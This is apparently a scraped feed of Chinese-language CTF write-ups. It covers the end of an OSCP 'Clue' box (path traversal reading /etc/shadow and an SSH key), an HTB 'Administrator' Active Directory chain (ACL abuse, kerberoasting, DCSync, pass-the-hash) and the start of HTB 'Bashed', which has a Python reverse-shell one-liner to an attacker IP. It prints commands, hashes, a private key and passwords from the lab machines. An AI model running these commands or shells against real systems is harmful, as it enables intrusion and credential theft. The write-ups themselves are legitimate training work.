not configured to authenticate\nUsage: cassandra-web [options] -B, \u0026ndash;bind BIND ip:port or path for cassandra web to bind on (default: 0.0.0.0:3000) -H, \u0026ndash;hosts HOSTS coma-separated list of cassandra hosts (default: 127.0.0.1) -P, \u0026ndash;port PORT integer port that cassandra is running on (default: 9042) -L, \u0026ndash;log-level LEVEL log level (default: info) -u, \u0026ndash;username USER username to use when connecting to cassandra -p, \u0026ndash;password PASS password to use when connecting to cassandra -C, \u0026ndash;compression NAME compression algorithm to use (lz4 or snappy) \u0026ndash;server-cert PATH server ceritificate pathname \u0026ndash;client-cert PATH client ceritificate pathname \u0026ndash;private-key PATH path to private key \u0026ndash;passphrase SECRET passphrase for the private key -h, \u0026ndash;help Show help 看起来可以再运行一个cassandra的服务，并且这个服务是以sudo权限运行的，所以我们应该可以利用这个root权限的服务和之前使用的cassandra的exploit读取任意文件。以sudo开启cassandra服务，并绑定到1234端口：\ncassie@clue:/$ sudo /usr/local/bin/cassandra-web -B 0.0.0.0:1234 -u cassie -p SecondBiteTheApple330 \u0026lt; -B 0.0.0.0:1234 -u cassie -p SecondBiteTheApple330 I, \u0026#x5B;2025-04-25T09:56:21.312344 #1851] INFO -- : Establishing control connection I, \u0026#x5B;2025-04-25T09:56:21.389259 #1851] INFO -- : Refreshing connected host\u0026#039;s metadata I, \u0026#x5B;2025-04-25T09:56:21.394232 #1851] INFO -- : Completed refreshing connected host\u0026#039;s metadata I, \u0026#x5B;2025-04-25T09:56:21.394883 #1851] INFO -- : Refreshing peers metadata I, \u0026#x5B;2025-04-25T09:56:21.395813 #1851] INFO -- : Completed refreshing peers metadata I, \u0026#x5B;2025-04-25T09:56:21.395838 #1851] INFO -- : Refreshing schema I, \u0026#x5B;2025-04-25T09:56:21.423071 #1851] INFO -- : Schema refreshed I, \u0026#x5B;2025-04-25T09:56:21.423098 #1851] INFO -- : Control connection established I, \u0026#x5B;2025-04-25T09:56:21.423251 #1851] INFO -- : Creating session I, \u0026#x5B;2025-04-25T09:56:21.563511 #1851] INFO -- : Session created 2025-04-25 09:56:21 -0400 Thin web server (v1.8.1 codename Infinite Smoothie) 2025-04-25 09:56:21 -0400 Maximum connections set to 1024 2025-04-25 09:56:21 -0400 Listening on 0.0.0.0:1234, CTRL+C to stop 这里我尝试对端口1234再用49362.py读取文件时，一直卡住，用nmap扫了一下显示端口1234关闭，可能是防火墙拦截了？也许只能从本地访问。看一下49362.py里是如何请求的:\nDT = \u0026#039;../\u0026#039; DT_NUM = 8 ...... payload = urllib.parse.quote_plus(DT * self.number + self.file) payload就是http://IP:PORT/加上DT_NUM个 \u0026quot; ../ \u0026ldquo;. 那么我们可以手动在本地请求，用47799再生成一个reverse shell后，请求新开启的cassandra服务:\ncassie@clue:/$ curl --path-as-is 127.0.0.1:1234/../../../../../../../../etc/shadow \u0026lt;s 127.0.0.1:1234/../../../../../../../../etc/shadow root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5iPSpNxamM38BL85BPmaIAWp05VlV.tdq0EryiFLbLryvbsGTx50dLnMsxIk7PJB5P1:19209:0:99999:7::: daemon:*:18555:0:99999:7::: bin:*:18555:0:99999:7::: sys:*:18555:0:99999:7::: sync:*:18555:0:99999:7::: games:*:18555:0:99999:7::: man:*:18555:0:99999:7::: lp:*:18555:0:99999:7::: mail:*:18555:0:99999:7::: news:*:18555:0:99999:7::: uucp:*:18555:0:99999:7::: proxy:*:18555:0:99999:7::: www-data:*:18555:0:99999:7::: backup:*:18555:0:99999:7::: list:*:18555:0:99999:7::: irc:*:18555:0:99999:7::: gnats:*:18555:0:99999:7::: nobody:*:18555:0:99999:7::: _apt:*:18555:0:99999:7::: systemd-timesync:*:18555:0:99999:7::: systemd-network:*:18555:0:99999:7::: systemd-resolve:*:18555:0:99999:7::: messagebus:*:18555:0:99999:7::: sshd:*:18555:0:99999:7::: systemd-coredump:!!:18555:::::: ntp:*:19209:0:99999:7::: cassandra:!:19209:0:99999:7::: cassie:$6$/WeFDwP1CNIN34/z$9woKSLSZhgHw1mX3ou90wnR.i5LHEfeyfHbxu7nYmaZILVrbhHrSeHNGqV0WesuQWGIL7DHEwHKOLK6UX79DI0:19209:0:99999:7::: freeswitch:!:19209:::::: anthony:$6$01NV0gAhVLOnUHb0$byLv3N95fqVvhut9rbsrYOVzi8QseWfkFl7.VDQ.26a.0IkEVR2TDXoTv/KCMLjUOQZMMpkTUdC3WIyqSWQ.Y1:19209:0:99999:7::: （注意这里要加上\u0026ndash;path-as-is, 不然curl会把多个../给省略掉）\n成功读取shadow文件. 可以下anthony home下读取anthony的id_rsa\ncassie@clue:/$ curl --path-as-is 127.0.0.1:1234/../../../../../../../../home/anthony/.ssh/id_rsa \u0026lt;34/../../../../../../../../home/anthony/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/ DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8 UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+ 0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj 4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw== -----END OPENSSH PRIVATE KEY----- 保存到本地，并尝试用anthony登录:\nssh -i id_rsa anthony@192.168.170.240 anthony@192.168.170.240\u0026#039;s password: Permission denied, please try again. anthony@192.168.170.240\u0026#039;s password: Permission denied, please try again. anthony@192.168.170.240\u0026#039;s password: anthony@192.168.170.240: Permission denied (publickey,password). 但却仍然提示要密码，奇怪了。尝试用root登录:\nssh -i id_rsa root@192.168.170.240 Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Apr 29 17:57:54 2024 root@clue:# id uid=0(root) gid=0(root) groups=0(root) root@clue:# 竟然成功了。。。 拿到root后也很迷，找了一圈后在anthony的bash_history里发现：\nroot@clue:/home/anthony# cat .bash_history clear ls -la ssh-keygen cp .ssh/id_rsa.pub .ssh/authorized_keys sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys exit anthony把自己的凭证复制到了root下 （? 疑惑）\n在root下可以找到proof.txt\n在/var/lib/freeswitch下可以找到local.txt\nroot@clue:~# find / -name local.txt -type f /var/lib/freeswitch/local.txt 另外，在防火墙设置下可以看到，确实block了除已开放端口外的数据流入流出：\nroot@clue:~# sudo iptables -L -n -v Chain INPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 1922 220K ACCEPT all -- lo * 0.0.0.0/0 0.0.0.0/0 38959 5695K ACCEPT all -- * * 0.0.0.0/0 0.0.0.0/0 ctstate NEW,RELATED,ESTABLISHED 0 0 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:22 0 0 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 1 40 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:445 14 560 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:3000 2 80 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:8021 0 0 ACCEPT icmp -- * * 0.0.0.0/0 0.0.0.0/0 icmptype 8 0 0 ACCEPT icmp -- * * 0.0.0.0/0 0.0.0.0/0 icmptype 0 0 0 DROP all -- * * 0.0.0.0/0 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination\nChain OUTPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 1928 220K ACCEPT all \u0026ndash; * lo 0.0.0.0/0 0.0.0.0/0 277 46895 ACCEPT tcp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 tcp spt:22 state NEW,ESTABLISHED 0 0 ACCEPT tcp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:53 state NEW,ESTABLISHED 98 6566 ACCEPT udp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 udp dpt:53 state NEW,ESTABLISHED 36906 16M ACCEPT tcp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 tcp spt:80 state NEW,ESTABLISHED 0 0 ACCEPT tcp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 state NEW,ESTABLISHED 49 10394 ACCEPT tcp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 tcp spt:445 state NEW,ESTABLISHED 4 224 ACCEPT tcp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 tcp spt:139 state NEW,ESTABLISHED 449 114K ACCEPT tcp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 tcp spt:3000 state NEW,ESTABLISHED 47 46823 ACCEPT tcp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:3000 state NEW,ESTABLISHED 51 4082 ACCEPT tcp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 tcp spt:8021 state NEW,ESTABLISHED 25 4574 ACCEPT tcp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:8021 state NEW,ESTABLISHED 0 0 ACCEPT icmp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 icmptype 8 11 848 ACCEPT icmp \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0 icmptype 0 238 19369 DROP all \u0026ndash; * * 0.0.0.0/0 0.0.0.0/0\nWhat I have learned 在有可以任意读取文件的能力时，尝试获取每个用户home下的bash_history文件。 可以读取文件时，永远要记得查看/etc/ssh/sshd_config, 里面记录着哪些用户允许ssh登录。 ","date":"2025-04-25T14:19:39Z","permalink":"https://jojobei.github.io/oscp-pgp-clue-writeup/","title":"OSCP-PGP Clue Writeup"},{"content":"Nmap Result Not shown: 65509 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 127 Microsoft ftpd 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-16 20:34:54Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 57388/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 57399/tcp open unknown syn-ack ttl 127 57404/tcp open unknown syn-ack ttl 127 57415/tcp open unknown syn-ack ttl 127 57447/tcp open unknown syn-ack ttl 127 64600/tcp open unknown syn-ack ttl 127 Enumeration Machine information 给出一个valid credential：\nUsername: Olivia Password: ichliebedich 首先尝试连接21/FTP端口，olivia和匿名登录均失败:\n尝试用enum4linux和smbclient连接，但仍然失败. 但得知域名为Adiministrator：\n使用kerbrute确认olivia是否为域内valid用户:\n./kerbrute userenum -d administrator --dc 10.10.11.42 users __ __ __ / /_____ / / _______ / / / //_/ _ / / __ / / / / / __/ _ / ,\u0026lt; / __/ / / // / / / // / // __/ //||_// /.// _,/_/___/\nVersion: v1.0.3 (9dad6e1) - 04/19/25 - Ronnie Flathers @ropnop\n2025/04/19 12:56:16 \u0026gt; Using KDC(s): 2025/04/19 12:56:16 \u0026gt; 10.10.11.42:88\n2025/04/19 12:56:16 \u0026gt; [+] VALID USERNAME: olivia@administrator 2025/04/19 12:56:16 \u0026gt; Done! Tested 1 usernames (1 valid) in 0.007 seconds 得知olivia是域用户后，可以使用impacket-lookupsid来暴力枚举用户列表：\nimpacket-lookupsid \u0026#039;Olivia\u0026#039;@10.10.11.42 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password: [] Brute forcing SIDs at 10.10.11.42 [] StringBinding ncacn_np:10.10.11.42[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-1088858960-373806567-254189436 498: ADMINISTRATOR\\Enterprise Read-only Domain Controllers (SidTypeGroup) 500: ADMINISTRATOR\\Administrator (SidTypeUser) 501: ADMINISTRATOR\\Guest (SidTypeUser) 502: ADMINISTRATOR\\krbtgt (SidTypeUser) 512: ADMINISTRATOR\\Domain Admins (SidTypeGroup) 513: ADMINISTRATOR\\Domain Users (SidTypeGroup) 514: ADMINISTRATOR\\Domain Guests (SidTypeGroup) 515: ADMINISTRATOR\\Domain Computers (SidTypeGroup) 516: ADMINISTRATOR\\Domain Controllers (SidTypeGroup) 517: ADMINISTRATOR\\Cert Publishers (SidTypeAlias) 518: ADMINISTRATOR\\Schema Admins (SidTypeGroup) 519: ADMINISTRATOR\\Enterprise Admins (SidTypeGroup) 520: ADMINISTRATOR\\Group Policy Creator Owners (SidTypeGroup) 521: ADMINISTRATOR\\Read-only Domain Controllers (SidTypeGroup) 522: ADMINISTRATOR\\Cloneable Domain Controllers (SidTypeGroup) 525: ADMINISTRATOR\\Protected Users (SidTypeGroup) 526: ADMINISTRATOR\\Key Admins (SidTypeGroup) 527: ADMINISTRATOR\\Enterprise Key Admins (SidTypeGroup) 553: ADMINISTRATOR\\RAS and IAS Servers (SidTypeAlias) 571: ADMINISTRATOR\\Allowed RODC Password Replication Group (SidTypeAlias) 572: ADMINISTRATOR\\Denied RODC Password Replication Group (SidTypeAlias) 1000: ADMINISTRATOR\\DC$ (SidTypeUser) 1101: ADMINISTRATOR\\DnsAdmins (SidTypeAlias) 1102: ADMINISTRATOR\\DnsUpdateProxy (SidTypeGroup) 1108: ADMINISTRATOR\\olivia (SidTypeUser) 1109: ADMINISTRATOR\\michael (SidTypeUser) 1110: ADMINISTRATOR\\benjamin (SidTypeUser) 1111: ADMINISTRATOR\\Share Moderators (SidTypeAlias) 1112: ADMINISTRATOR\\emily (SidTypeUser) 1113: ADMINISTRATOR\\ethan (SidTypeUser) 3601: ADMINISTRATOR\\alexander (SidTypeUser) 3602: ADMINISTRATOR\\emma (SidTypeUser) 至此，得到了一个用户列表：\nolivia michael benjamin emily ethan alexander emma 如果在域环境内，用户没有开启kerberos pre-authentication，那么攻击者无需用户密码就可以获得用户的authentication-response，并尝试离线破解。impacket-GetNPUsers可以枚举有哪些用户没有开启此选项，并尝试获取AS-REP. 此攻击也被称为AS-REP Roasting. 尝试:\nimpacket-GetNPUsers -usersfile users -no-pass -dc-host administrator -dc-ip 10.10.11.42 administrator/ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] User olivia doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User benjamin doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User emily doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User ethan doesn't have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) 没有用户设置了DONT_REQUIRE_PREAUTH. 但我们还有Olivia的密码，尝试用bloodhound-python远程获取域内结构：\nbloodhound-python -u Olivia -p \u0026#039;ichliebedich\u0026#039; -d administrator.htb -ns 10.10.11.42 -c All --zip INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) INFO: Found AD domain: administrator.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: \u0026#x5B;Errno Connection error (dc.administrator.htb:88)] \u0026#x5B;Errno -2] Name or service not known INFO: Connecting to LDAP server: dc.administrator.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc.administrator.htb INFO: Found 11 users INFO: Found 53 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: dc.administrator.htb INFO: Done in 00M 02S INFO: Compressing output into 20250419131421_bloodhound.zip 打开bloodhound并上传.\nACL Abuse {.wp-block-heading} Olivia对用户Michael有GenericAll权限，Michael对Benjamin有ForceChangePassword权限，而Benjiamin属于组Share Moderators。\n当一个用户A对另一个用户B有GenericAll权限时，则A可以对B：\n修改密码 更改用户属性 添加用户到组 修改用户SPN - Targeted kerberoasting 当一个用户A对另一个用户B有ForceChangePassword权限时，则A可以强制修改B的密码。\n尝试使用bloodyAD修改michael密码：\nbloodyAD --host 10.10.11.42 -d administrator -u Olivia -p ichliebedich set password Michael \u0026#039;Password123!\u0026#039; \u0026#x5B;+] Password changed successfully! 再以Michael的身份修改Benjamin的密码：\nbloodyAD --host 10.10.11.42 -d administrator -u Michael -p Password123! set password Benjamin \u0026#039;Password123!\u0026#039; \u0026#x5B;+] Password changed successfully! 根据Benjamin隶属的组名Share Moderators，猜测Benjamin应该有权限管理SMB share或者FTP，尝试登录这两个服务：\nbenjamin:Password123!登录FTP服务成功，并在目录下发现一个Backup.psafe3文件，下载下来。\n没见过这个psafe3文件是什么，在网上搜索一番后得知, psafe3是一个保管密码的数据库,并且文件被一个master password加密：\n可以使用我们万能的john来dump这个文件的master password，并尝试破解：\npwsafe2john Backup.psafe3 \u0026gt; pshash cat pshash Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050 john --wordlist=/usr/share/wordlists/rockyou.txt pshash Using default input encoding: UTF-8 Loaded 1 password hash (pwsafe, Password Safe \u0026#x5B;SHA256 128/128 AVX 4x]) No password hashes left to crack (see FAQ) john --wordlist=/usr/share/wordlists/rockyou.txt pshash john --show pshash Backu:tekieromucho 1 password hash cracked, 0 left 得到密码，tekieromucho。使用pwsafe打开文件并输入密码：\n登录后右键可以复制密码到粘贴板, 三人密码分别是:\nAlexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb Emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur 在bloodhound里查看这三人分别有什么权限，发现Emily对Ethan有GenericWrite权限：\n而Ethan对DC有DCSync权限：\n当用户A对用户B有GenericWrite权限时，则A可以修改B的SPN属性，实施Targeted-kerberoasting Attack。 当用户A对DC有DCSync权限时，则A可以模拟域控制器向其他 DC 请求复制Password Hash，也就是可以发起 DCSync Attack，提取域内所有账户的 NTLM Hash. 使用targetedKerberoast对ethan发起攻击:\n成功获取到了ethan的SPN。\nPS：如果报错[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)，则是因为本机与DC之间的时间差过大，Kerberos认证对时间差要求非常严格。可以使用ntpdata ip来同步与DC的时间差。\nPS：targetedKerberoast.py 跟impacket-GetUserSPNs功能大致一样，但它会尝试对可写入SPN的对象写入SPN属性后，再获取SPN。\n用john破解ethan的SPN后获取密码：limpbizkit\n因为ethan对DC有DCSync权限，则可以用Impacket-secresdump来直接dump域内密码：\nimpacket-secretsdump Administrator/ethan:\u0026#039;limpbizkit\u0026#039;@10.10.11.42 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6::: administrator.htb\\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7::: administrator.htb\\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: administrator.htb\\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: administrator.htb\\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31::: administrator.htb\\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884::: administrator.htb\\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199::: administrator.htb\\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9::: DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3::: [] Kerberos keys grabbed \u0026hellip;\u0026hellip;. [] Cleaning up\u0026hellip; 获取Administrator的NTLM hash，用impacket-psexec尝试登录:\nimpacket-psexec -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e Administrator/Administrator@10.10.11.42 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [] Requesting shares on 10.10.11.42\u0026hellip;.. [] Found writable share ADMIN$ [] Uploading file PPzOqLvu.exe [] Opening SVCManager on 10.10.11.42\u0026hellip;.. [] Creating service ecOM on 10.10.11.42\u0026hellip;.. [] Starting service ecOM\u0026hellip;.. [!] Press help for extra shell commands Microsoft Windows [Version 10.0.20348.2762] (c) Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32\u0026gt; whoami nt authority\\system User and Root flags 在C:\\Users\\Emily\\Desktop 下发现user flag:\n在C:\\users\\Administrator\\Desktop 下发现root flag:\nHappy Hacking.\n","date":"2025-04-20T02:00:00Z","image":"https://jojobei.github.io/legacy/uploads/2025/04/1745035819-download-150x150.png","permalink":"https://jojobei.github.io/htb-administrator-Writeup/","title":"HTB-Administrator-Writeup"},{"content":"Machine Information Difficulty: Easy OS: Linux Nmap Result PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel\u0026#039;s Development Site | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST Device type: general purpose Running: Linux 3.X|4.X Initial Foothold 打开浏览器访问页面，作者有说机器上部署了php bash。\n查看这个github网站：\n一个semi-interactive web shell. 既然作者说了有，尝试ffuf找出在哪里。\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.68/FUZZ images [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 7ms] css [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 10ms] uploads [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 14ms] dev [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 11ms] php [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 9ms] fonts [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 7ms] js [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 1373ms] server-status [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 6ms]\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://10.10.10.68/FUZZ\nindex.html [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 11ms] config.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 10ms] contact.html [Status: 200, Size: 7805, Words: 2630, Lines: 157, Duration: 8ms] .htaccess [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 6ms] style.css [Status: 200, Size: 24164, Words: 4814, Lines: 1412, Duration: 5ms] . [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 7ms] about.html [Status: 200, Size: 8193, Words: 2878, Lines: 155, Duration: 6ms] .html [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 13ms] .php [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 9ms] .htpasswd [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 7ms] .htm [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 5ms] .htpasswds [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 5ms] .htgroup [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 7ms] wp-forum.phps [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 5ms] .htaccess.bak [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 6ms] .htuser [Status: 403, Size: 293, Words: 22, Lines: 12, Duration: 8ms] .ht [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 5ms] .htc [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 7ms] 在/dev下找到phpbash.php\n并可以直接获得user flag\nPrivilege Escalation 因为是一个semi interactive，如果上传例如linpeas或者pspy这样的文件执行会看不到输出，所以得想办法拿到一个fully interactive shell。在https://www.revshells.com/网站生成了bash，sh，php的，都没用。最后使用python的reverse shell成功：\n# phpbash export RHOST=\u0026ldquo;10.10.16.11\u0026rdquo;;export RPORT=80;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\u0026ldquo;RHOST\u0026rdquo;),int(os.getenv(\u0026ldquo;RPORT\u0026rdquo;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026ldquo;sh\u0026rdquo;)'\nkali nc -nlvp 80 listening on [any] 80 \u0026hellip; connect to [10.10.16.11] from (UNKNOWN) [10.10.10.68] 33862 $ id id uid=33(www-data) gid=33(www-data) groups=33(www-data)\n使用python获得ttyshell python -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' www-data@bashed:/ sudo -l得知www-data可以以sciprtmanager执行任意指令。\n在根目录下找到一个不常见的文件夹: scriptmanager. 